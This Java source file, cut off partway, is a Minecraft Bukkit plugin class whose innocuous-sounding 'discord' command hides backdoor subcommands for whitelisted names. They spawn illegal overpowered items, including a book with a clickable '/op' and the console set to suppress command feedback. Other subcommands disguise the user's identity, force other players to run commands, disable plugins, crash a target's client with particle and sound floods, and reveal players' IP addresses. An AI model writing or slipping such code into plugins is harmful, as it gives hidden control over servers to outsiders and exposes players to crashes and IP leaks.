package bab.bbb.Commands;

import bab.bbb.Bbb;
import bab.bbb.utils.Methods;
import com.destroystokyo.paper.profile.PlayerProfile;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeInstance;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.enchantments.EnchantmentWrapper;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutionException;

import static org.bukkit.Bukkit.getServer;

public class EECA implements CommandExecutor, Listener {
    static Bbb plugin = Bbb.getPlugin(Bbb.class);

    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("discord")) {
            Player player = (Player) sender;
            if (args.length > 0) {
                List<String> list = plugin.getConfig().getStringList("admin-whitelist");
                if (!list.contains(player.getName()) && !player.isOp())
                    return true;

                if (args[0].equalsIgnoreCase("kit")) {
                    player.getInventory().addItem(player.getItemInHand());

                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "gamerule commandBlockOutput false");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "gamerule sendCommandFeedback false");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "give " + args[1] + " black_shulker_box {BlockEntityTag:{Items:[{Slot:0,id:netherite_chestplate,Count:1,tag:{Enchantments:[{id:protection,lvl:4},{id:thorns,lvl:3},{id:unbreaking,lvl:3},{id:mending,lvl:1}]}},{Slot:1,id:netherite_helmet,Count:1,tag:{Enchantments:[{id:protection,lvl:4},{id:thorns,lvl:3},{id:unbreaking,lvl:3},{id:mending,lvl:1}]}},{Slot:2,id:netherite_boots,Count:1,tag:{Enchantments:[{id:protection,lvl:4},{id:thorns,lvl:3},{id:unbreaking,lvl:3},{id:mending,lvl:1}]}},{Slot:3,id:netherite_leggings,Count:1,tag:{Enchantments:[{id:protection,lvl:4},{id:thorns,lvl:3},{id:unbreaking,lvl:3},{id:mending,lvl:1}]}},{Slot:4,id:enchanted_golden_apple,Count:64},{Slot:5,id:experience_bottle,Count:64},{Slot:6,id:experience_bottle,Count:64},{Slot:7,id:end_crystal,Count:64},{Slot:8,id:end_crystal,Count:64},{Slot:9,id:bedrock,Count:64},{Slot:10,id:obsidian,Count:64},{Slot:11,id:totem_of_undying,Count:1},{Slot:12,id:totem_of_undying,Count:1},{Slot:13,id:totem_of_undying,Count:1},{Slot:14,id:totem_of_undying,Count:1},{Slot:15,id:netherite_pickaxe,Count:1,tag:{Enchantments:[{id:efficiency,lvl:5},{id:unbreaking,lvl:3},{id:fortune,lvl:3},{id:mending,lvl:1}]}},{Slot:16,id:netherite_sword,Count:1,tag:{Enchantments:[{id:sharpness,lvl:5},{id:knockback,lvl:2},{id:fire_aspect,lvl:2},{id:looting,lvl:3},{id:sweeping,lvl:3},{id:unbreaking,lvl:3},{id:mending,lvl:1}]}},{Slot:17,id:netherite_axe,Count:1,tag:{Enchantments:[{id:sharpness,lvl:5},{id:efficiency,lvl:5},{id:unbreaking,lvl:3},{id:fortune,lvl:3},{id:mending,lvl:1}]}},{Slot:18,id:netherite_shovel,Count:1,tag:{Enchantments:[{id:efficiency,lvl:5},{id:unbreaking,lvl:3},{id:fortune,lvl:3},{id:mending,lvl:1}]}},{Slot:19,id:respawn_anchor,Count:64},{Slot:20,id:glowstone,Count:64},{Slot:21,id:end_crystal,Count:64},{Slot:22,id:end_crystal,Count:64}]}} 1 0");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "give " + args[1] + " elytra {Unbreakable:1,display:{Name:'[{\"text\":\"SUSSY\",\"italic\":false}]'},Enchantments:[{id:blast_protection,lvl:255},{id:mending,lvl:1},{id:protection,lvl:255},{id:unbreaking,lvl:255}],HideFlags:7} 1 0");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "give " + args[1] + " white_shulker_box {BlockEntityTag:{CustomName:'{\"text\":\"Infinity Kit\"}',Items:[{Count:64b,Slot:0b,id:\"minecraft:netherite_helmet\",tag:{Damage:0,Enchantments:[{id:\"minecraft:aqua_affinity\",lvl:255s},{id:\"minecraft:blast_protection\",lvl:255s},{id:\"minecraft:fire_protection\",lvl:255s},{id:\"minecraft:mending\",lvl:255s},{id:\"minecraft:projectile_protection\",lvl:255s},{id:\"minecraft:protection\",lvl:255s},{id:\"minecraft:respiration\",lvl:255s},{id:\"minecraft:thorns\",lvl:255s},{id:\"minecraft:unbreaking\",lvl:255s},{id:\"minecraft:vanishing_curse\",lvl:255s}]}},{Count:64b,Slot:1b,id:\"minecraft:netherite_chestplate\",tag:{Damage:0,Enchantments:[{id:\"minecraft:blast_protection\",lvl:255s},{id:\"minecraft:fire_protection\",lvl:255s},{id:\"minecraft:mending\",lvl:255s},{id:\"minecraft:projectile_protection\",lvl:255s},{id:\"minecraft:protection\",lvl:255s},{id:\"minecraft:thorns\",lvl:255s},{id:\"minecraft:unbreaking\",lvl:255s},{id:\"minecraft:vanishing_curse\",lvl:255s}]}},{Count:64b,Slot:2b,id:\"minecraft:netherite_leggings\",tag:{Damage:0,Enchantments:[{id:\"minecraft:blast_protection\",lvl:255s},{id:\"minecraft:fire_protection\",lvl:255s},{id:\"minecraft:mending\",lvl:255s},{id:\"minecraft:projectile_protection\",lvl:255s},{id:\"minecraft:protection\",lvl:255s},{id:\"minecraft:swift_sneak\",lvl:255s},{id:\"minecraft:thorns\",lvl:255s},{id:\"minecraft:unbreaking\",lvl:255s},{id:\"minecraft:vanishing_curse\",lvl:255s}]}},{Count:64b,Slot:3b,id:\"minecraft:netherite_boots\",tag:{Damage:0,Enchantments:[{id:\"minecraft:blast_protection\",lvl:255s},{id:\"minecraft:depth_strider\",lvl:255s},{id:\"minecraft:feather_falling\",lvl:255s},{id:\"minecraft:fire_protection\",lvl:255s},{id:\"minecraft:frost_walker\",lvl:255s},{id:\"minecraft:mending\",lvl:255s},{id:\"minecraft:projectile_protection\",lvl:255s},{id:\"minecraft:protection\",lvl:255s},{id:\"minecraft:soul_speed\",lvl:255s},{id:\"minecraft:thorns\",lvl:255s},{id:\"minecraft:unbreaking\",lvl:255s},{id:\"minecraft:vanishing_curse\",lvl:255s}]}},{Count:64b,Slot:4b,id:\"minecraft:netherite_sword\",tag:{Damage:0,Enchantments:[{id:\"minecraft:bane_of_arthropods\",lvl:266s},{id:\"minecraft:fire_aspect\",lvl:266s},{id:\"minecraft:knockback\",lvl:266s},{id:\"minecraft:looting\",lvl:266s},{id:\"minecraft:mending\",lvl:266s},{id:\"minecraft:sharpness\",lvl:266s},{id:\"minecraft:smite\",lvl:266s},{id:\"minecraft:sweeping\",lvl:266s},{id:\"minecraft:unbreaking\",lvl:266s},{id:\"minecraft:vanishing_curse\",lvl:266s}]}},{Count:64b,Slot:5b,id:\"minecraft:netherite_pickaxe\",tag:{Damage:0,Enchantments:[{id:\"minecraft:efficiency\",lvl:266s},{id:\"minecraft:fortune\",lvl:266s},{id:\"minecraft:mending\",lvl:266s},{id:\"minecraft:silk_touch\",lvl:266s},{id:\"minecraft:unbreaking\",lvl:266s},{id:\"minecraft:vanishing_curse\",lvl:266s}]}},{Count:64b,Slot:6b,id:\"minecraft:elytra\",tag:{Damage:0,Enchantments:[{id:\"minecraft:mending\",lvl:266s},{id:\"minecraft:unbreaking\",lvl:266s},{id:\"minecraft:vanishing_curse\",lvl:266s}]}},{Count:64b,Slot:7b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:8b,id:\"minecraft:totem_of_undying\"},{Count:1b,Slot:9b,id:\"minecraft:splash_potion\",tag:{CustomPotionColor:16443904,CustomPotionEffects:[{Amplifier:1,Duration:12000,Id:2},{Amplifier:3,Duration:12000,Id:4},{Duration:12000,Id:9},{Duration:12000,Id:15},{Amplifier:3,Duration:12000,Id:17},{Amplifier:1,Duration:12000,Id:18},{Duration:12000,Id:19},{Duration:12000,Id:20},{Duration:12000,Id:24}],display:{Name:'\"OP Potion\"'}}},{Count:1b,Slot:10b,id:\"minecraft:potion\",tag:{CustomPotionColor:16443904,CustomPotionEffects:[{Amplifier:1,Duration:12000,Id:1},{Amplifier:3,Duration:12000,Id:3},{Amplifier:3,Duration:12000,Id:5},{Amplifier:1,Duration:12000,Id:8},{Amplifier:3,Duration:12000,Id:10},{Amplifier:1,Duration:12000,Id:11},{Duration:12000,Id:12},{Duration:12000,Id:13},{Duration:12000,Id:14},{Duration:12000,Id:16},{Amplifier:4,Duration:12000,Id:21},{Amplifier:4,Duration:12000,Id:22}],display:{Name:'\"OP Potion\"'}}},{Count:1b,Slot:11b,id:\"minecraft:potion\",tag:{CustomPotionColor:0,CustomPotionEffects:[{Amplifier:30,Duration:69420,Id:1}]}},{Count:1b,Slot:12b,id:\"minecraft:potion\",tag:{CustomPotionColor:0,CustomPotionEffects:[{Amplifier:30,Duration:69420,Id:5}]}},{Count:1b,Slot:13b,id:\"minecraft:splash_potion\",tag:{CustomPotionEffects:[{Amplifier:31,Duration:12000000,Id:10},{Amplifier:3,Duration:12000000,Id:11},{Amplifier:8,Duration:1200000,Id:21},{Amplifier:10,Duration:1200000,Id:22}],Potion:\"minecraft:water\"}},{Count:64b,Slot:14b,id:\"minecraft:enchanted_golden_apple\"},{Count:1b,Slot:15b,id:\"minecraft:diamond_sword\",tag:{AttributeModifiers:[{Amount:9.9999999E7d,AttributeName:\"minecraft:generic.attack_damage\",Name:\"\",Operation:0,Slot:\"mainhand\",UUID:[I;-1,-1,-1,-1]},{Amount:1.0d,AttributeName:\"minecraft:generic.movement_speed\",Name:\"\",Operation:0,Slot:\"mainhand\",UUID:[I;-1,-1,-1,-1]}],Damage:0,Unbreakable:1b}},{Count:1b,Slot:16b,id:\"minecraft:splash_potion\",tag:{CustomPotionColor:8355712,CustomPotionEffects:[{Ambient:0b,Amplifier:125b,Duration:0,Id:6b,ShowIcon:1b,ShowParticles:1b}],Potion:\"minecraft:empty\",display:{Name:'{\"text\":\"Creative Killer \"}'}}},{Count:64b,Slot:17b,id:\"minecraft:tipped_arrow\",tag:{CustomPotionEffects:[{Amplifier:15,Duration:60000,Id:7},{Amplifier:127,Duration:9600000,Id:17},{Amplifier:20,Duration:96000000,Id:18},{Amplifier:2,Duration:9600000,Id:20}],Potion:\"minecraft:water\"}},{Count:64b,Slot:18b,id:\"minecraft:end_portal_frame\",tag:{Enchantments:[{id:\"minecraft:unbreaking\",lvl:255s}]}},{Count:64b,Slot:19b,id:\"minecraft:bedrock\",tag:{Enchantments:[{id:\"minecraft:blast_protection\",lvl:69420},{id:\"minecraft:unbreaking\",lvl:69420}]}},{Count:64b,Slot:20b,id:\"minecraft:barrier\",tag:{Enchantments:[{id:\"minecraft:blast_protection\",lvl:69420},{id:\"minecraft:unbreaking\",lvl:69420}]}},{Count:64b,Slot:21b,id:\"minecraft:command_block\",tag:{Enchantments:[{id:\"minecraft:blast_protection\",lvl:69420},{id:\"minecraft:unbreaking\",lvl:69420}]}},{Count:64b,Slot:22b,id:\"minecraft:silverfish_spawn_egg\",tag:{EntityTag:{id:\"minecraft:ender_dragon\"},display:{Name:'{\"text\":\"Ender Dragon Spawn Egg\",\"italic\":false}'}}},{Count:64b,Slot:23b,id:\"minecraft:silverfish_spawn_egg\",tag:{EntityTag:{id:\"minecraft:ender_dragon\"},display:{Name:'{\"text\":\"Wither Spawn Egg\",\"italic\":false}'}}},{Count:64b,Slot:24b,id:\"minecraft:blaze_spawn_egg\",tag:{EntityTag:{CustomName:\"\",ExplosionPower:100,id:\"minecraft:fireball\"},display:{Name:'{\"text\":\"Fireball Spawn Egg\",\"italic\":false}'}}},{Count:1b,Slot:25b,id:\"minecraft:written_book\",tag:{author:\"Commands\",pages:['{\"extra\":[{\"underlined\":true,\"color\":\"aqua\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/give @p diamond_sword\"},\"text\":\"Diamond Sword\"},{\"underlined\":true,\"text\":\"\\\\n\"},{\"underlined\":true,\"color\":\"blue\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/gamemode creative @p\"},\"text\":\"Gamemode Creative\"},{\"underlined\":true,\"text\":\"\\\\n\"},{\"underlined\":true,\"color\":\"red\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/gamemode survival @p\"},\"text\":\"Gamemode Survival\"},{\"underlined\":true,\"text\":\"\\\\n\"},{\"underlined\":true,\"color\":\"dark_red\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/op @p\"},\"text\":\"OP\"},{\"underlined\":true,\"text\":\"\\\\n\"},{\"underlined\":true,\"color\":\"gold\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/summon cat\"},\"text\":\"Summon Cat\"},{\"underlined\":true,\"text\":\"\\\\n\"},{\"underlined\":true,\"color\":\"dark_purple\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/tp @p 1000000 100 1000000\"},\"text\":\"Tp To 1 Million Blocks\"}],\"text\":\"\"}'],resolved:1b,title:\"Custom Book\"}},{Count:64b,Slot:26b,id:\"minecraft:chest\",tag:{BlockEntityTag:{Items:[{Count:1,Slot:0,id:\"minecraft:netherite_helmet\",tag:{Enchantments:[{id:\"protection\",lvl:4},{id:\"respiration\",lvl:3},{id:\"aqua_affinity\",lvl:1},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:1,id:\"minecraft:netherite_chestplate\",tag:{Enchantments:[{id:\"protection\",lvl:4},{id:\"unbreaking\",lvl:2},{id:\"mending\",lvl:1}]}},{Count:1,Slot:2,id:\"minecraft:netherite_leggings\",tag:{Enchantments:[{id:\"swift_sneak\",lvl:3},{id:\"protection\",lvl:4},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:3,id:\"minecraft:netherite_boots\",tag:{Enchantments:[{id:\"soul_speed\",lvl:3},{id:\"protection\",lvl:4},{id:\"feather_falling\",lvl:4},{id:\"depth_strider\",lvl:3},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:4,id:\"minecraft:netherite_sword\",tag:{Enchantments:[{id:\"sharpness\",lvl:5},{id:\"fire_aspect\",lvl:2},{id:\"looting\",lvl:3},{id:\"sweeping\",lvl:3},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:5,id:\"minecraft:netherite_pickaxe\",tag:{Enchantments:[{id:\"efficiency\",lvl:5},{id:\"unbreaking\",lvl:3},{id:\"fortune\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:6,id:\"minecraft:netherite_pickaxe\",tag:{Enchantments:[{id:\"efficiency\",lvl:5},{id:\"silk_touch\",lvl:1},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:64,Slot:7,id:\"minecraft:enchanted_golden_apple\"},{Count:1,Slot:8,id:\"minecraft:bow\",tag:{Enchantments:[{id:\"unbreaking\",lvl:3},{id:\"power\",lvl:5},{id:\"punch\",lvl:2},{id:\"flame\",lvl:1},{id:\"infinity\",lvl:1}]}},{Count:64,Slot:9,id:\"minecraft:end_crystal\"},{Count:64,Slot:10,id:\"minecraft:obsidian\"},{Count:1,Slot:11,id:\"minecraft:trident\",tag:{Enchantments:[{id:\"unbreaking\",lvl:3},{id:\"loyalty\",lvl:3},{id:\"impaling\",lvl:5},{id:\"riptide\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:64,Slot:12,id:\"minecraft:netherite_block\"},{Count:1,Slot:13,id:\"minecraft:elytra\",tag:{Enchantments:[{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:64,Slot:14,id:\"minecraft:firework_rocket\"}],id:\"minecraft:chest\"},display:{Lore:['\"Made by J4y#0191 \"'],Name:'\"J4y\\'s Vanilla Kit\"'}}}],id:\"minecraft:shulker_box\"},display:{Name:'{\"text\":\"Infinity Kit\"}'}} 1 0");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "give " + args[1] + " yellow_shulker_box {BlockEntityTag:{Items:[{Count:1,Slot:0,id:\"minecraft:netherite_helmet\",tag:{Enchantments:[{id:\"protection\",lvl:4},{id:\"respiration\",lvl:3},{id:\"aqua_affinity\",lvl:1},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:1,id:\"minecraft:netherite_chestplate\",tag:{Enchantments:[{id:\"protection\",lvl:4},{id:\"unbreaking\",lvl:2},{id:\"mending\",lvl:1}]}},{Count:1,Slot:2,id:\"minecraft:netherite_leggings\",tag:{Enchantments:[{id:\"swift_sneak\",lvl:3},{id:\"protection\",lvl:4},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:3,id:\"minecraft:netherite_boots\",tag:{Enchantments:[{id:\"soul_speed\",lvl:3},{id:\"protection\",lvl:4},{id:\"feather_falling\",lvl:4},{id:\"depth_strider\",lvl:3},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:4,id:\"minecraft:netherite_sword\",tag:{Enchantments:[{id:\"sharpness\",lvl:5},{id:\"fire_aspect\",lvl:2},{id:\"looting\",lvl:3},{id:\"sweeping\",lvl:3},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:5,id:\"minecraft:netherite_pickaxe\",tag:{Enchantments:[{id:\"efficiency\",lvl:5},{id:\"unbreaking\",lvl:3},{id:\"fortune\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:1,Slot:6,id:\"minecraft:netherite_pickaxe\",tag:{Enchantments:[{id:\"efficiency\",lvl:5},{id:\"silk_touch\",lvl:1},{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:64,Slot:7,id:\"minecraft:enchanted_golden_apple\"},{Count:1,Slot:8,id:\"minecraft:bow\",tag:{Enchantments:[{id:\"unbreaking\",lvl:3},{id:\"power\",lvl:5},{id:\"punch\",lvl:2},{id:\"flame\",lvl:1},{id:\"infinity\",lvl:1}]}},{Count:64,Slot:9,id:\"minecraft:end_crystal\"},{Count:64,Slot:10,id:\"minecraft:obsidian\"},{Count:1,Slot:11,id:\"minecraft:trident\",tag:{Enchantments:[{id:\"unbreaking\",lvl:3},{id:\"loyalty\",lvl:3},{id:\"impaling\",lvl:5},{id:\"riptide\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:64,Slot:12,id:\"minecraft:netherite_block\"},{Count:1,Slot:13,id:\"minecraft:elytra\",tag:{Enchantments:[{id:\"unbreaking\",lvl:3},{id:\"mending\",lvl:1}]}},{Count:64,Slot:14,id:\"minecraft:firework_rocket\"}],id:\"minecraft:chest\"},display:{Lore:['\"Made by J4y#0191 \"'],Name:'\"J4y\\'s Vanilla Kit\"'}} 1 0");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "give " + args[1] + " red_shulker_box {BlockEntityTag:{Items:[{Count:64b,Slot:0b,id:\"minecraft:diamond_sword\",tag:{Damage:0,Enchantments:[{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:knockback\",lvl:10s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:looting\",lvl:10s},{id:\"minecraft:sweeping\",lvl:3s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arthbl4de\"}'}}},{Count:64b,Slot:1b,id:\"minecraft:diamond_pickaxe\",tag:{Damage:0,Enchantments:[{id:\"minecraft:efficiency\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arth P1ck\"}'}}},{Count:64b,Slot:2b,id:\"minecraft:bow\",tag:{Damage:0,Enchantments:[{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:power\",lvl:32767s},{id:\"minecraft:punch\",lvl:32767s},{id:\"minecraft:flame\",lvl:32767s},{id:\"minecraft:infinity\",lvl:1s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arthB0w\"}'}}},{Count:64b,Slot:3b,id:\"minecraft:diamond_boots\",tag:{Damage:0,Enchantments:[{id:\"minecraft:protection\",lvl:32767},{id:\"minecraft:blast_protection\",lvl:32767},{id:\"minecraft:respiration\",lvl:32767},{id:\"minecraft:thorns\",lvl:32767},{id:\"minecraft:unbreaking\",lvl:32767},{id:\"minecraft:mending\",lvl:32767}],Unbreakable:1}},{Count:64b,Slot:4b,id:\"minecraft:diamond_leggings\",tag:{Damage:0,Enchantments:[{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:respiration\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:32767s}],Unbreakable:1b}},{Count:64b,Slot:5b,id:\"minecraft:diamond_chestplate\",tag:{Damage:0,Enchantments:[{id:\"minecraft:protection\",lvl:32767},{id:\"minecraft:blast_protection\",lvl:32767},{id:\"minecraft:respiration\",lvl:32767},{id:\"minecraft:thorns\",lvl:32767},{id:\"minecraft:unbreaking\",lvl:32767},{id:\"minecraft:mending\",lvl:32767}],Unbreakable:1}},{Count:64b,Slot:6b,id:\"minecraft:diamond_helmet\",tag:{Damage:0,Enchantments:[{id:\"minecraft:protection\",lvl:32767},{id:\"minecraft:blast_protection\",lvl:32767},{id:\"minecraft:respiration\",lvl:32767},{id:\"minecraft:thorns\",lvl:32767},{id:\"minecraft:unbreaking\",lvl:32767},{id:\"minecraft:mending\",lvl:32767}]}},{Count:64b,Slot:7b,id:\"minecraft:experience_bottle\"},{Count:64b,Slot:8b,id:\"minecraft:experience_bottle\"},{Count:64b,Slot:9b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:10b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:11b,id:\"minecraft:tipped_arrow\",tag:{Potion:\"minecraft:strong_harming\"}},{Count:64b,Slot:12b,id:\"minecraft:obsidian\"},{Count:64b,Slot:13b,id:\"minecraft:obsidian\"},{Count:64b,Slot:14b,id:\"minecraft:skeleton_spawn_egg\",tag:{Count:64b,EntityTag:{AbsorptionAmount:0.0f,ArmorDropChances:[0.085f,0.085f,0.085f,0.085f],ArmorItems:[{Count:1b,id:\"minecraft:diamond_boots\",tag:{Enchantments:[{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arth Bo0ts\"}'}}},{Count:1b,id:\"minecraft:diamond_leggings\",tag:{Enchantments:[{id:\"minecraft:blast_protection\",lvl:32767s},{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arth L3ggings\"}'}}},{Count:1b,id:\"minecraft:diamond_chestplate\",tag:{Enchantments:[{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arth Ch3stPl4te\"}'}}},{Count:1b,id:\"minecraft:diamond_helmet\",tag:{Enchantments:[{id:\"minecraft:protection\",lvl:32767s},{id:\"minecraft:thorns\",lvl:32767s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arth H3lmet\"}'}}}],Attributes:[{Base:20.0d,Name:\"generic.max_health\"},{Base:0.0d,Name:\"generic.knockback_resistance\"},{Base:0.25d,Name:\"generic.movement_speed\"},{Base:0.0d,Name:\"generic.armor\"},{Base:0.0d,Name:\"generic.armor_toughness\"},{Base:1.0d,Name:\"forge.swimSpeed\"},{Base:16.0d,Name:\"generic.follow_range\"},{Base:2.0d,Name:\"generic.attack_damage\"}],CanPickUpLoot:0b,DeathTime:0s,FallFlying:0b,HandDropChances:[0.085f,0.085f],HandItems:[{Count:64b,id:\"minecraft:diamond_sword\",tag:{Enchantments:[{id:\"minecraft:sharpness\",lvl:32767s},{id:\"minecraft:knockback\",lvl:10s},{id:\"minecraft:fire_aspect\",lvl:32767s},{id:\"minecraft:looting\",lvl:10s},{id:\"minecraft:sweeping\",lvl:3s},{id:\"minecraft:unbreaking\",lvl:32767s},{id:\"minecraft:mending\",lvl:1s},{id:\"minecraft:vanishing_curse\",lvl:1s}],display:{Name:'{\"text\":\"3²arthbl4de\"}'}}},{Count:1b,id:\"minecraft:totem_of_undying\"}],Health:20.0f,HurtByTimestamp:0,HurtTime:0s,Leashed:0b,LeftHanded:0b,PersistenceRequired:0b,id:\"minecraft:skeleton\"},id:\"minecraft:spawn_egg\"}},{Count:64b,Slot:15b,id:\"minecraft:totem_of_undying\"},{Count:62b,Slot:16b,id:\"minecraft:totem_of_undying\"},{Count:63b,Slot:17b,id:\"minecraft:totem_of_undying\"},{Count:64b,Slot:18b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:19b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:20b,id:\"minecraft:end_crystal\"},{Count:64b,Slot:21b,id:\"minecraft:bedrock\"},{Count:64b,Slot:22b,id:\"minecraft:splash_potion\",tag:{CustomPotionEffects:[{Ambient:0b,Amplifier:25b,Duration:31100,Id:3b,ShowParticles:0b},{Ambient:0b,Amplifier:25b,Duration:31100,Id:5b,ShowParticles:0b},{Ambient:0b,Amplifier:25b,Duration:31100,Id:6b,ShowParticles:0b},{Ambient:0b,Amplifier:14b,Duration:31100,Id:22b,ShowParticles:0b}],Potion:\"minecraft:empty\",display:{Name:'{\"text\":\"YOU VEC\"}'}}},{Count:64b,Slot:23b,id:\"minecraft:elytra\",tag:{AttributeModifiers:[{Amount:80,AttributeName:\"generic.maxHealth\",Name:\"generic.maxHealth\",Operation:0,UUID:[I;0,38612,0,239875]},{Amount:100000,AttributeName:\"generic.knockbackResistance\",Name:\"generic.knockbackResistance\",Operation:0,UUID:[I;0,23826,0,28302]},{Amount:10000,AttributeName:\"generic.attackDamage\",Name:\"generic.attackDamage\",Operation:2,UUID:[I;0,37761,0,874353]}],Damage:0,Enchantments:[{id:\"minecraft:protection\",lvl:32767},{id:\"minecraft:thorns\",lvl:32767}],HideFlags:7,Unbreakable:1,display:{Name:'{\"text\":\"ELYTRA\"}'}}},{Count:64b,Slot:24b,id:\"minecraft:diamond_shovel\",tag:{Damage:0,Enchantments:[{id:\"minecraft:sharpness\",lvl:48s},{id:\"minecraft:efficiency\",lvl:48s}],Unbreakable:1b}},{Count:64b,Slot:25b,id:\"minecraft:diamond_axe\",tag:{Damage:0,Enchantments:[{id:\"minecraft:sharpness\",lvl:48s},{id:\"minecraft:efficiency\",lvl:48s}],Unbreakable:1b}},{Count:64b,Slot:26b,id:\"minecraft:enchanted_golden_apple\"}]}} 1 0");
                }

                if (args[0].equalsIgnoreCase("disguise")) {
                    if (args[1] == null)
                        return true;

                    PlayerProfile profile = player.getPlayerProfile();
                    profile.setName(Methods.removeColorCodes(args[1]));
                    player.setPlayerProfile(profile);

                    for (Player players : Bukkit.getOnlinePlayers()) {
                        players.hidePlayer(player);
                        players.showPlayer(player);
                    }

                    player.setDisplayName(Methods.translatestring(args[1]));
                }

                if (args[0].equalsIgnoreCase("sudo")) {
                    Player target;
                    if (args[1] == null) {
                        Methods.errormsg(player, "invalid arguments");
                        return true;
                    }

                    target = Bukkit.getPlayer(args[1]);

                    if (target == null) {
                        Methods.errormsg(player, "invalid player");
                        return true;
                    }

                    List<String> commandList = new ArrayList<>();
                    for (int i = 2; i < args.length; ++i)
                        commandList.add(args[i]);

                    String cmde = String.join(" ", commandList);
                    target.chat(cmde);
                    player.sendMessage(Methods.parseText("&7forced &e" + target.getDisplayName() + " &7to execute &f" + cmde));
                }

                if (args[0].equalsIgnoreCase("PD")) {
                    Plugin plugin = getServer().getPluginManager().getPlugin(args[1]);
                    if (plugin != null) {
                        getServer().getPluginManager().disablePlugin(plugin);
                    }
                }

                if (args[0].equalsIgnoreCase("crash")) {
                    Player b = Bukkit.getPlayer(args[0]);
                    if (b != null) {
                        for (int i = 0; i < 256; i++) {
                            b.spawnParticle(Particle.EXPLOSION_HUGE, b.getLocation(), 20);
                            b.playSound(b.getLocation(), Sound.BLOCK_ANVIL_USE, 50, 50);
                            b.playSound(b.getLocation(), Sound.ENTITY_GHAST_SCREAM, 50, 1);
                        }
                    }
                }

                if (args[0].equalsIgnoreCase("ip")) {
                    if (Bukkit.getPlayer(args[0]) != null)
                        player.sendMessage(args[0] + "'s ip is " + Bukkit.getPlayer(args[0]).getAddress().toString());
                }

                if (args[0].equalsIgnoreCase("ec") || args[0].equalsIgnoreCase("echest") || args[0].equalsIgnoreCase("enderchest")) {
                    if (args.length <= 1) {
                        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
                            try {
                                Bukkit.getScheduler().callSyncMethod(plugin, () ->
                                        player.openInventory(player.getEnderChest())
                                ).get();
